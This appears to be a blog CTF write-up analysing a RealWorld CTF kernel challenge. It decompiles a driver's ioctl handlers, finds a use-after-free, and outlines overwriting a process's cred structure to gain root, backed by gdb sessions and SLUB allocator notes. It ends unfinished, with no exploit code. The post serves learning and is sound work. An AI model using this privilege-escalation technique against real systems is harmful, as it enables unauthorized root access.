---
layout: post
title: "RealWorldCTF-digging_into_kernel"
date: 2022-06-07
description: ""
category: 
tags: []

---

* TOC
{:toc}


## 2022-RealWorld-CTF(experience competition)-digger_into_kernel

[Attachment](https://github.com/wumingzhilian/wumingzhilian.github.io/blob/master/Digging_into_Kernel_dfe60641bc6185b43a0f9c0932a27f76.tar.xz)

### Check Materials

```
$ xz -d Digging_into_Kernel_dfe60641bc6185b43a0f9c0932a27f76.tar.xz
$ tar xvf Digging_into_Kernel_dfe60641bc6185b43a0f9c0932a27f76.tar
ezkernel/
ezkernel/bzImage
ezkernel/rootfs.cpio
ezkernel/run.sh
ezkernel/pow.py
$ cd ezkernel
$ cat run.sh
qemu-system-x86_64 \
	-kernel bzImage \
	-initrd rootfs.cpio \
	-append "console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet kalsr" \
	-cpu kvm64,+smep,+smap \
	--nographic

```

 `run.sh`  is a qemu script; meanwhile,`rootfs.cpio` is the root filesystem,`bzImage` is the Linux kernel,`-append` enables kalsr and `+smep +smap`enables two protections, one is to prohibit `ret2user`, and the other is to prohibit ROP chain.

To facilitate debugging, we can use the gdb parameter, `-gdb tcp::1234` ,to open the debugging port.

This `run.sh ` script  does not  contain the argument of `-monitor null` , so you can enter the monitor mode by pressing `ctrl+A` and then entering C (Ps: the command execution of the host can be equivalent to escape)



![image-20220527223240975](https://cdn.jsdelivr.net/gh/wumingzhilian/image/imgwin/202205272232046.png)

When we try to decompress the file, we can see four files; as shown above, pow.py is used to prevent `DDOS`, `rootfs.cpio` is the root file system provided, and we decompress and view the file system initialization script.

```
$ cpio -div < rootfs.cpio
$ cat etc/init.d/rcS
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev

echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/kptr_restrict

insmod /xkmod.ko
chmod 644 /dev/xkmod

echo flag{xxxxxxxxx} > /flag
chmod 600 /flag

echo "-------------------------------------------"
echo "|                                         |"
echo "| |~~\|  |  | /~~~~|~~|~~  /~\ /~~\/~\/|  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |  \ \/ \/  \__  |  |    /__ \__//___|_ |"
echo "|                                         |"
echo "-------------------------------------------"


poweroff -d 120 -f &
setsid cttyhack setuidgid 1000 sh

poweroff -f

```

Analysis of the scripts:

- The `mount` is used to mount , and  `echo 1 ` enables kernel protection.

- `Dmesg_restrict` is used to read the content of the `kernel ring buffer`. When we turn on the defense, non-root users cannot read it.

- As we can see, the `kptr_restrict` protection is enabled, which prohibits the user mode from reading the `kallsyms ` symbol table.

- The `insmod` command is used to load the kernel driver.

- The `poweroff` command is used to shut down the system.

- The `setsid` command is used to set the initialization user. We modify the script to be the root user and comment on the shutdown command to facilitate debugging. The modification of the startup script is as follows.

```
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev

echo 1 > /proc/sys/kernel/dmesg_restrict
echo 1 > /proc/sys/kernel/kptr_restrict

insmod /xkmod.ko
chmod 644 /dev/xkmod

echo flag{xxxxxxxxx} > /flag
chmod 600 /flag

echo "-------------------------------------------"
echo "|                                         |"
echo "| |~~\|  |  | /~~~~|~~|~~  /~\ /~~\/~\/|  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |__/|  |  ||     |  |--   ,/|    |,/ |  |"
echo "| |  \ \/ \/  \__  |  |    /__ \__//___|_ |"
echo "|                                         |"
echo "-------------------------------------------"


#poweroff -d 120 -f &
setsid cttyhack setuidgid 0 sh
#poweroff -f
```



### Vulnerability Analysis

Analysis of kernel modules:

We first check the file information of `xkmod.xo` through `checksec`, and drag the `xkmod.ko` into IDA Pro.

```
$ checksec xkmod.ko 
[*] '/home/giantbranch/kernel/kernel_for_ctf/ezkernel/xkmod.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)

```

Like `babydriver`, there is a data structure and several functions,`xkmod_init`,`xkmod_exit`,`xkmod_open`,`xkmod_release` and `xkmod_ioctl`.

Analysis of `xkmod_init`,`xkmod_exit`:

```
int __cdecl xkmod_init()
{
  kmem_cache *v0; // rax

  printk(&unk_1E4);
  misc_register(&xkmod_device);
  v0 = (kmem_cache *)kmem_cache_create("lalala", 192LL, 0LL, 0LL, 0LL);
  buf = 0LL;
  s = v0;
  return 0;
}
```

The `xkmod_init` uses the  `register` to register the driver; `kmem_cache_create` creates a Lalala slab of size 192 or 0xc0.

Firstly, the `xkmod_exit()` prints the kernel information and then destroys the driver.

```
void __cdecl xkmod_exit()
{
  printk(&unk_204);
  misc_deregister(&xkmod_device);
}
```

Analysis of  `xkmod_release` :

The `xkmod_release`  releases the buffer applied by the driver, but there are also some problems. It only frees the space of `s`  but does not set the s pointer to NULL.

```
int __fastcall xkmod_release(inode *inode, file *file)
{
  return kmem_cache_free(s, buf);
}
```

Analysis of  `xkmod_ioctl`:

```
__int64 __fastcall xkmod_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 v4; // [rsp+0h] [rbp-20h] BYREF
  unsigned int v5; // [rsp+8h] [rbp-18h]
  unsigned int v6; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v7; // [rsp+10h] [rbp-10h]

  v7 = __readgsqword(0x28u);
  if ( !a3 )
    return 0LL;
  copy_from_user(&v4, a3, 16LL);
  if ( a2 == 107374182 )
  {
    if ( buf && v6 <= 0x50 && v5 <= 0x70 )
    {
      copy_from_user((char *)buf + (int)v5, v4, (int)v6);
      return 0LL;
    }
  }
  else
  {
    if ( a2 != 125269879 )
    {
      if ( a2 == 17895697 )
        buf = (void *)kmem_cache_alloc(s, 3264LL);
      return 0LL;
    }
    if ( buf && v6 <= 0x50 && v5 <= 0x70 )
    {
      copy_to_user(v4, (char *)buf + (int)v5);
      return 0LL;
    }
  }
  return xkmod_ioctl_cold();
}
```

`ioctl` is a system call that is used to communicate with the device.

There are three parameters :

`int ioctl(int fd,unsigned long cmd,unsigned long value)`

For easy viewing, we optimize the code.

```
__int64 __fastcall xkmod_ioctl(__int64 fd, int cmd, __int64 value)
{
  __int64 user_data; // [rsp+0h] [rbp-20h] BYREF
  unsigned int index; // [rsp+8h] [rbp-18h]
  unsigned int len; // [rsp+Ch] [rbp-14h]
  unsigned __int64 v7; // [rsp+10h] [rbp-10h]

  v7 = __readgsqword(0x28u);
  if ( !value )
    return 0LL;
  copy_from_user(&user_data, value, 0x10LL);
  if ( cmd == 0x6666666 )
  {
    if ( buf && len <= 0x50 && index <= 0x70 )
    {
      copy_from_user((char *)buf + (int)index, user_data, (int)len);
      return 0LL;
    }
  }
  else
  {
    if ( cmd != 0x7777777 )
    {
      if ( cmd == 0x1111111 )
        buf = (void *)kmem_cache_alloc(s, 0xCC0LL);
      return 0LL;
    }
    if ( buf && len <= 0x50 && index <= 0x70 )
    {
      copy_to_user(user_data, (char *)buf + (int)index);
      return 0LL;
    }
  }
  return xkmod_ioctl_cold();
}
```

There are two relative functions here, one is `copy_from_user` and the other is `copy_to_user`.

The `copy_from_user` function implements the transfer of user space data to kernel space,which is called  "write".

The `copy_to_user` function implements the transfer of kernel space data to user space,which is called  "output".

We look at the value of the `user_data`: 0x10 = dq(0x8)+dd(0x4)+dd(0x4)

````
copy_from_user(&user_data, value, 0x10LL);
````

In other words, the `user_data` itself is a structure with `three offsets`  or   ` variables`.

When the equation `cmd == 0x66666` holds, we can write the data of `user_data   ` of  length  `len`  to `buf+index`.

```
  if ( cmd == 0x6666666 )
  {
    if ( buf && len <= 0x50 && index <= 0x70 )
    {
      copy_from_user((char *)buf + (int)index, user_data, (int)len);
      return 0LL;
    }
  }
```

When the equation `cmd == 0x111111` holds ,we can use the `kmem_cache_alloc` to allocate `0xc0` space to `s` from the `0xcc0 ` free block.

```
if ( cmd == 0x1111111 )
        buf = (void *)kmem_cache_alloc(s, 0xCC0LL);
      return 0LL;
```



When the equation `cmd == 0x777777` holds,we can use `copy_to_user` 

to read data from `buf+index`offset address into `user_data`.

```
if ( buf && len <= 0x50 && index <= 0x70 )
    {
      copy_to_user(user_data, (char *)buf + (int)index);
      return 0LL;
    }
```

#### Trick

https://elixir.bootlin.com/linux/v5.4.38/source/include/linux/sched.h#L878

In the kernel, each process is allocated a `task_struct` structure containing `process information`, `structure information`, and a `cred structure`.

```
	/* Empty if CONFIG_POSIX_CPUTIMERS=n */
	struct posix_cputimers		posix_cputimers;

	/* Process credentials: */

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
```

The cred structure contains the `permission information` of each process,such as `uid`, `gid`,`suid`, etc.

https://elixir.bootlin.com/linux/v5.4.38/source/include/linux/cred.h#L111

```
struct cred {
	atomic_t	usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
	atomic_t	subscribers;	/* number of processes subscribed */
	void		*put_addr;
	unsigned	magic;
#define CRED_MAGIC	0x43736564
#define CRED_MAGIC_DEAD	0x44656144
#endif
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	unsigned	securebits;	/* SUID-less security management */
	kernel_cap_t	cap_inheritable; /* caps our children can inherit */
	kernel_cap_t	cap_permitted;	/* caps we're permitted */
	kernel_cap_t	cap_effective;	/* caps we can actually use */
	kernel_cap_t	cap_bset;	/* capability bounding set */
	kernel_cap_t	cap_ambient;	/* Ambient capability set */
	……

	extern struct cred *prepare_creds(void);
	……
```

Analysis of `cred_init` :

https://elixir.bootlin.com/linux/v5.4.38/source/kernel/cred.c#L656

```
……
void __init cred_init(void)
{
	/* allocate a slab in which we can store credentials */
	cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0,
			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
}
……
```

Both `kmem_cache_create`  and  `kmem_cache_alloc` are slab allocator-based memory allocation methods, and these are suitable for repeated allocation and release of memory blocks of the same size.

Create a cache region with the `kmem_cache_create`  and then use the `kmem_cache_alloc` to fetch a new block of memory from that cache region.

In the `cred_init` function, we create a slab called `cred_jar` with the size of a cred structure through `kmem_cache_create`.

Analysis of `prepare_creds`:

This structure is used to apply and generate the cred structure.

https://elixir.bootlin.com/linux/v5.4.38/source/kernel/cred.c#L250

```
struct cred *prepare_creds(void)
{
	struct task_struct *task = current;
	const struct cred *old;
	struct cred *new;

	validate_process_creds();

	new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
	if (!new)
		return NULL;

	kdebug("prepare_creds() alloc %p", new);

	old = task->cred;
	memcpy(new, old, sizeof(struct cred));

	new->non_rcu = 0;
	atomic_set(&new->usage, 1);
	set_cred_subscribers(new, 0);
	get_group_info(new->group_info);
	get_uid(new->user);
	get_user_ns(new->user_ns);

#ifdef CONFIG_KEYS
	key_get(new->session_keyring);
	key_get(new->process_keyring);
	key_get(new->thread_keyring);
	key_get(new->request_key_auth);
#endif
……
```

`new = kmem_cache_alloc(cred_jar, GFP_KERNEL);`

Apply for `cred_jar` throuth the `kmem_cache_alloc`  and  in the current case ,the size of the `cred_jar` is exactly 0xc0. Meanwhile,the `cred_jar` is a `dedicated slab`.

```
/ # cat /proc/slabinfo | grep cred
# name            <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab> : tunables <limit> <batchcount> <sharedfactor> : slabdata <active_slabs> <num_slabs> <sharedavail>
cred_jar             105    105    192   21    1 : tunables    0    0    0 : slabdata      5      5      0

```

When we apply for slab again, the` cred_jar` is assigned to us, and we can control the content of `cred_jar` and modify the permission information. 

That is to say, when we open two drivers simultaneously, they will share a buf. If one driver is released, we will obtain the  `dangling pointer` of the other driver.

At this time, we construct a `UAF` vulnerability.

We can synchronously modify the `parent process's permission information` by `forking` the child process and then modifying its `cred_jar` information.

#### Experimental Validation

When we `debug`, we need a kernel `symbol table`.

```
$ vmlinux-to-elf bzImage vmlinux.elf 
[+] Kernel successfully decompressed in-memory (the offsets that follow will be given relative to the decompressed binary)
[+] Version string: Linux version 5.4.38 (root@8b917a48e929) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #1 SMP Wed Apr 7 10:16:29 HKT 2021
[+] Guessed architecture: x86_64 successfully in 3.96 seconds
[+] Found kallsyms_token_table at file offset 0x013d9be8
[+] Found kallsyms_token_index at file offset 0x013d9f40
[+] Found kallsyms_markers at file offset 0x013d98b8
[+] Found kallsyms_names at file offset 0x01338150
[+] Found kallsyms_num_syms at file offset 0x01338148
[i] Negative offsets overall: 100 %
[i] Null addresses overall: 0 %
[+] Found kallsyms_offsets at file offset 0x01305260
[+] Successfully wrote the new ELF kernel to vmlinux.elf

```

We modify the `run.sh` script, open the port `1234 ` to debug, and close the `kalsr ` protection.

```
qemu-system-x86_64 \
        -kernel bzImage \
        -initrd rootf2.cpio \
        -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init quiet noalsr" \
        -cpu kvm64,+smep,+smap \
        --nographic \
        --gdb tcp::1234
```

We will use the `root `user for debugging.

```
$ gdb vmlinux.elf 
pwndbg> target remote 127.0.0.1:1234
Remote debugging using 127.0.0.1:1234
0xffffffffae28237e in ?? ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xffffffffae282360 ◂— 0xdfe62d8b65555441
 RBX  0x0
 RCX  0x0
 RDX  0x1
 RDI  0x0
 RSI  0x83
 R8   0xffff9cfb0761c980 ◂— 0
 R9   0xf
 R10  0x0
 R11  0x0
 R12  0xffffffffaec11780 ◂— 0x80004000
 R13  0x0
 R14  0x0
 R15  0xffffffffaec11780 ◂— 0x80004000
 RBP  0x0
 RSP  0xffffffffaec03ea0 ◂— 0x0
 RIP  0xffffffffae28237e ◂— mov    ebp, dword ptr gs:[rip + 0x51d8dfcb] /* 0xf51d8dfcb2d8b65 */
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0xffffffffae28237e    mov    ebp, dword ptr gs:[rip + 0x51d8dfcb]
   0xffffffffae282385    nop    dword ptr [rax + rax]
   0xffffffffae28238a    pop    rbx
   0xffffffffae28238b    pop    rbp
   0xffffffffae28238c    pop    r12
   0xffffffffae28238e    ret    
 
   0xffffffffae28238f    mov    eax, dword ptr gs:[rip + 0x51d8dfba]
   0xffffffffae282396    mov    eax, eax
   0xffffffffae282398    bt     qword ptr [rip + 0xac1520], rax
   0xffffffffae2823a0    jae    0xffffffffae282370
    ↓
   0xffffffffae282370    jmp    0xffffffffae28237c
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0xffffffffaec03ea0 ◂— 0x0
01:0008│      0xffffffffaec03ea8 —▸ 0xffffffffaec11780 ◂— 0x80004000
... ↓
03:0018│      0xffffffffaec03eb8 —▸ 0xffffffffad89673d ◂— jmp    0xffffffffad896660 /* 0x529e8ffffff1ee9 */
04:0020│      0xffffffffaec03ec0 —▸ 0xffffffffaec11780 ◂— 0x80004000
05:0028│      0xffffffffaec03ec8 ◂— 0x3a /* ':' */
06:0030│      0xffffffffaec03ed0 ◂— 0x4e395c014fd51500
07:0038│      0xffffffffaec03ed8 ◂— 0x0
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 ffffffffae28237e
   f 1                0
```

Firstly, we set the breakpoint at the `prepare_cred` function

```
/ # cat /proc/kallsyms | grep prepare_cred
ffffffffad88a890 T prepare_creds
ffffffffadb3fa60 T security_prepare_creds
/ # cat /proc/kallsyms | grep kmem_cache_alloc
ffffffffad9837b0 T __kmem_cache_alloc_bulk
ffffffffad9c1690 T kmem_cache_alloc
ffffffffad9c1850 T kmem_cache_alloc_trace
ffffffffad9c1a80 T kmem_cache_alloc_node
ffffffffad9c1c60 T kmem_cache_alloc_node_trace
ffffffffad9c22b0 T kmem_cache_alloc_bulk
```


We set a `breakpoint` in gdb.

```
pwndbg> b *0xffffffffad88a890
Breakpoint 1 at 0xffffffffad88a890
```

We can execute the command arbitrarily and then execute the `si ` to call the function that is `kmem_cache_alloc`.

```
0xffffffffad88a8a8 in ?? ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xffff9cfb071b1f00 ◂— 4
 RBX  0xffff9cfb05c0a580 ◂— 0
 RCX  0x178
 RDX  0xffffffffaec42e60 ◂— 0x2a00000030 /* '0' */
 RDI  0xffff9cfb07082500 ◂— nop     /* 0x2c090 */
 RSI  0xcc0
 R8   0x2bf98
 R9   0x0
 R10  0x0
 R11  0x2bf40
 R12  0xffff9cfb05c08000 ◂— add    byte ptr [rax], al /* 0x4000 */
 R13  0x0
 R14  0x1200000
 R15  0xffff9cfb05c08000 ◂— add    byte ptr [rax], al /* 0x4000 */
 RBP  0xffffb262401b7e78 ◂— 0x0
 RSP  0xffffb262401b7da8 ◂— 0x1200000
 RIP  0xffffffffad88a8a8 ◂— 0xc0854800136de3e8
───────────────────────────────────[ DISASM ]───────────────────────────────────
   0xffffffffad88a890    push   r12
   0xffffffffad88a892    mov    rdi, qword ptr [rip + 0x1a6f987]
   0xffffffffad88a899    mov    esi, 0xcc0
   0xffffffffad88a89e    push   rbx
   0xffffffffad88a89f    mov    rbx, qword ptr gs:[0x15d00]
 ► 0xffffffffad88a8a8    call   0xffffffffad9c1690
 
   0xffffffffad88a8ad    test   rax, rax
   0xffffffffad88a8b0    je     0xffffffffad88a978
 
   0xffffffffad88a8b6    mov    r8, qword ptr [rbx + 0x638]
   0xffffffffad88a8bd    mov    rdi, rax
   0xffffffffad88a8c0    mov    ecx, 0x15
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0xffffb262401b7da8 ◂— 0x1200000
01:0008│      0xffffb262401b7db0 —▸ 0xffff9cfb05c08000 ◂— add    byte ptr [rax], al /* 0x4000 */
02:0010│      0xffffb262401b7db8 —▸ 0xffffffffad88abe5 ◂— 0x840fc08548c58948
03:0018│      0xffffb262401b7dc0 —▸ 0xffffffffad8611f4 ◂— 0x5d5bbf7520fd8348
04:0020│      0xffffb262401b7dc8 —▸ 0xffff9cfb05c0a580 ◂— 0
05:0028│      0xffffb262401b7dd0 —▸ 0xffffb262401b7e78 ◂— 0x0
06:0030│      0xffffb262401b7dd8 —▸ 0xffffb262401b7ef0 ◂— 0x1200000
07:0038│      0xffffb262401b7de0 —▸ 0xffffffffad862acf ◂— 0x4bb880fc085
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 ffffffffad88a8a8
   f 1          1200000
   f 2 ffff9cfb05c08000
   f 3 ffffffffad88abe5
   f 4 ffffffffad8611f4
   f 5 ffff9cfb05c0a580
   f 6 ffffb262401b7e78
   f 7 ffffb262401b7ef0
   f 8 ffffffffad862acf
   f 9                3
   f 10 ffffb262401a4000

```

We can see that `0xffff9cfb07082500` is the address assigned to rdi

Secondly, because loading the driver will execute the `kmem_cache_create` function, so we set a `breakpoint` and load the driver.

```
/ # cat /proc/kallsyms | grep kmem_cache_create
ffffffffad982eb0 T kmem_cache_create_usercopy
ffffffffad983120 T kmem_cache_create
ffffffffad983a72 t kmem_cache_create_usercopy.cold
ffffffffad9c4290 T __kmem_cache_create
ffffffffad9c571d t __kmem_cache_create.cold

```

```
pwndbg> b *0xffffffffad983120
Breakpoint 3 at 0xffffffffad983120
```

Once we have set the breakpoint, we execute the `insmod xkmod.ko` command.

```
/ # insmod xkmod.ko
```

In the gdb panel, we can see the driver called Lalala, and the return address ` RAX  0xffff9cfb07082500`

```
pwndbg> c
Continuing.

Breakpoint 3, 0xffffffffad983120 in ?? ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0xffffffffc0074088 ◂— insb   byte ptr [rdi], dx /* 0x100616c616c616c; 'lalala' */
 RSI  0xc0
 R8   0x0
 R9   0x2
 R10  0xffff9cfb063dc91c ◂— 0x69 /* 'i' */
 R11  0xffff9cfb063dc184 ◂— 0
 R12  0xffff9cfb0639d580 —▸ 0xffff9cfb063f7fc0 —▸ 0xffffffffaea6789b ◂— 0x7365746f6e /* 'notes' */
 R13  0xffff9cfb063f8210 —▸ 0xffff9cfb063f8220 —▸ 0xffff9cfb063f8230 —▸ 0xffff9cfb063f8240 —▸ 0xffff9cfb063f8250 ◂— ...
 R14  0xffffffffc00751d0 —▸ 0xffff9cfb0732bfc8 ◂— 0xffff00646f6d6b78 /* 'xkmod' */
 R15  0xffffffffc0075180 ◂— 1
 RBP  0xffffffffc0078000 ◂— 0xe8c007406fc7c748
 RSP  0xffffb262401a7ca0 —▸ 0xffffffffc0078030 ◂— mov    qword ptr [rip - 0x2b73], 0 /* 0xffffd48d05c748 */
 RIP  0xffffffffad983120 ◂— 0xc03145c931455041
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0xffffffffad983120    push   r8
   0xffffffffad983122    xor    r9d, r9d
   0xffffffffad983125    xor    r8d, r8d
   0xffffffffad983128    call   0xffffffffad982eb0
 
   0xffffffffad98312d    pop    rdx
   0xffffffffad98312e    ret    
 
   0xffffffffad98312f    nop    
   0xffffffffad983130    push   r13
   0xffffffffad983132    mov    r13, rdx
   0xffffffffad983135    push   r12
   0xffffffffad983137    mov    r12, rsi
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0xffffb262401a7ca0 —▸ 0xffffffffc0078030 ◂— mov    qword ptr [rip - 0x2b73], 0 /* 0xffffd48d05c748 */
01:0008│      0xffffb262401a7ca8 —▸ 0xffffffffad800c01 ◂— 0x441f0fc58941
02:0010│      0xffffb262401a7cb0 —▸ 0xffffe2fdc0172308 —▸ 0xffffe2fdc0171d48 —▸ 0xffffe2fdc0171288 —▸ 0xffff9cfb07cf85c0 ◂— ...
03:0018│      0xffffb262401a7cb8 ◂— add    byte ptr [rdx], dh /* 0x5d25ec13c3bf3200 */
04:0020│      0xffffb262401a7cc0 ◂— 0x202
05:0028│      0xffffb262401a7cc8 —▸ 0xffffe2fdc01726c0 ◂— 0x100000000000000
06:0030│      0xffffb262401a7cd0 ◂— 0
07:0038│      0xffffb262401a7cd8 —▸ 0xffffffffae27e9b0 ◂— 0xffffffc8e8c3c031
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 ffffffffad983120
   f 1 ffffffffc0078030
   f 2 ffffffffad800c01
   f 3 ffffe2fdc0172308
   f 4 5d25ec13c3bf3200
   f 5              202
   f 6 ffffe2fdc01726c0
   f 7                0
Breakpoint *0xffffffffad983120
pwndbg> finish
Run till exit from #0  0xffffffffad983120 in ?? ()
0xffffffffc0078030 in ?? ()
ERROR: Could not find ELF base!
ERROR: Could not find ELF base!
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────[ REGISTERS ]──────────────────────────────────
 RAX  0xffff9cfb07082500 ◂— nop     /* 0x2c090 */
 RBX  0x0
 RCX  0x0
 RDX  0x0
 RDI  0xffffffffaec602a0 ◂— 0x0
 RSI  0xffff9cfb05ca7908 ◂— 1
 R8   0x0
 R9   0x228
 R10  0x0
 R11  0x0
 R12  0xffff9cfb0639d580 —▸ 0xffff9cfb063f7fc0 —▸ 0xffffffffaea6789b ◂— 0x7365746f6e /* 'notes' */
 R13  0xffff9cfb063f8210 —▸ 0xffff9cfb063f8220 —▸ 0xffff9cfb063f8230 —▸ 0xffff9cfb063f8240 —▸ 0xffff9cfb063f8250 ◂— ...
 R14  0xffffffffc00751d0 —▸ 0xffff9cfb0732bfc8 ◂— 0xffff00646f6d6b78 /* 'xkmod' */
 R15  0xffffffffc0075180 ◂— 1
 RBP  0xffffffffc0078000 ◂— 0xe8c007406fc7c748
 RSP  0xffffb262401a7ca8 —▸ 0xffffffffad800c01 ◂— 0x441f0fc58941
 RIP  0xffffffffc0078030 ◂— mov    qword ptr [rip - 0x2b73], 0 /* 0xffffd48d05c748 */
───────────────────────────────────[ DISASM ]───────────────────────────────────
 ► 0xffffffffc0078030    mov    qword ptr [rip - 0x2b73], 0
   0xffffffffc007803b    mov    qword ptr [rip - 0x2b82], rax
   0xffffffffc0078042    xor    eax, eax
   0xffffffffc0078044    ret    
    ↓
   0xffffffffad800c01    mov    r13d, eax
   0xffffffffad800c04    nop    dword ptr [rax + rax]
   0xffffffffad800c09    mov    eax, dword ptr gs:[rip + 0x528150b8]
   0xffffffffad800c10    and    eax, 0x7fffffff
   0xffffffffad800c15    mov    byte ptr [rsp], 0
   0xffffffffad800c19    cmp    eax, ebx
   0xffffffffad800c1b    je     0xffffffffad800c6b
───────────────────────────────────[ STACK ]────────────────────────────────────
00:0000│ rsp  0xffffb262401a7ca8 —▸ 0xffffffffad800c01 ◂— 0x441f0fc58941
01:0008│      0xffffb262401a7cb0 —▸ 0xffffe2fdc0172308 —▸ 0xffffe2fdc0171d48 —▸ 0xffffe2fdc0171288 —▸ 0xffff9cfb07cf85c0 ◂— ...
02:0010│      0xffffb262401a7cb8 ◂— add    byte ptr [rdx], dh /* 0x5d25ec13c3bf3200 */
03:0018│      0xffffb262401a7cc0 ◂— 0x202
04:0020│      0xffffb262401a7cc8 —▸ 0xffffe2fdc01726c0 ◂— 0x100000000000000
05:0028│      0xffffb262401a7cd0 ◂— 0
06:0030│      0xffffb262401a7cd8 —▸ 0xffffffffae27e9b0 ◂— 0xffffffc8e8c3c031
07:0038│      0xffffb262401a7ce0 —▸ 0xffffffffad9c188a ◂— 0x14b850fc085
─────────────────────────────────[ BACKTRACE ]──────────────────────────────────
 ► f 0 ffffffffc0078030
   f 1 ffffffffad800c01
   f 2 ffffe2fdc0172308
   f 3 5d25ec13c3bf3200
   f 4              202
   f 5 ffffe2fdc01726c0
   f 6                0
pwndbg> 

```

So it is consistent with our conjecture.

#### Slub Analysis

The `slub allocation mechanism` of the kernel itself has a property that when we go to apply for a `slub`  if we already have a `slub` of the `same size`, the kernel will initialization the slub that `already exists`, So we allocated slub and released slub are both the original `cred_jar`.

`kmem_cache_alloc ` allocate buf as  `dedicated cache` or `special cache` ,  and    `kmalloc` allocate buf as `general cache` or `general-purpose cache`.

The two caches are not cross-usable.

Because the two caches are  ` not cross-usable`, `cred_jar` and `kmalloc-192` are separate.

```
4.4.72

/*
 * initialise the credentials stuff
 */
void __init cred_init(void)
{
    /* allocate a slab in which we can store credentials */
    cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred),
                     0, SLAB_HWCACHE_ALIGN|SLAB_PANIC, NULL);
}
4.5

/*
 * initialise the credentials stuff
 */
void __init cred_init(void)
{
    /* allocate a slab in which we can store credentials */
    cred_jar = kmem_cache_create("cred_jar", sizeof(struct cred), 0,
            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, NULL);
}
```

In the comparison between kernel 4.4.74 and kernel 4.5, it can find that when a slab is created, an additional parameter is called `SLAB_ACCOUNT`, which means that `cred_jar` and `kmalloc-192` will not merge again.

##### Allocation Mechanism

Compared to the overhead of `slab` creating a new `mem_cache` at will, In terms of `kmem_cache` creation, `slub` introduces the mechanism of `object reuse`. When a new `kmem_cache` is created, The dispenser searches for pre-existing `kmem_cache` based on `size`.

If the `slub` is of equal size or slightly more splendid than `(sizeof (void *))`, it does not create but reuses the existing ` kmem_cache` with  count as `refcount + 1`.

In subsequent initialization, `kmem_cache_cpu` was used instead of the previous `array_cache`.

The original `slab` order was  `Local Buffer Pools` - > `Shared Buffer Pools` - > `Partial Idle List `- > `All Idle Lists` .

The `	slub` removes the `shared buffer pool` and retains part of the `idle list`.

There was no `slab` at the time of the first memory allocation. when you create a `slab` for the current `CPU` called the `local active slab ` , and the `free list` of `kmem_cache_cpu` points to the first `object`， When `retrying` again, you only need to use the pointing `object` and move the pointer to assign an available `object`.

If the `local activity slab` has no `idle object`, retrieve the new `slab` from `kmem_cache_cpu->partial` and reassemble it to the `free list`, where `kmem_cache_cpu->page` points to  the `slab` that is currently in use.

And If there is no `idle slab` in `kmem_cache_cpu-> partial`, retrieve the new `slab` from `kmem_cache_node->partial` and reassemble it to the `free list`, meanwhile, To shorten the next traverse, several more `slabs` are obtained and placed on the `kmem_cache_cpu->partial`.

This approach is much simpler and more efficient than the `slab` mechanism;  of course, it directly applies to a new `slab` if there is no `object`.

##### Free Mechanism

If the `object` to be released belongs to the `local active slab`, the mechanism adds it directly to the head of the current `free list` and moves  the `free list` behind the `object`.
But if the `object`  to be released belongs to the rest of the `slab`, The mechanism adds it to the idle queue of  the `slab`. And determine the `slab` state after release. Destroy `all idle slabs` or move to a different linked list as appropriate.

##### Slub Structure

![image-20220604221538496](https://cdn.jsdelivr.net/gh/wumingzhilian/image/imgwin/202206042215779.png)



##### Kmalloc

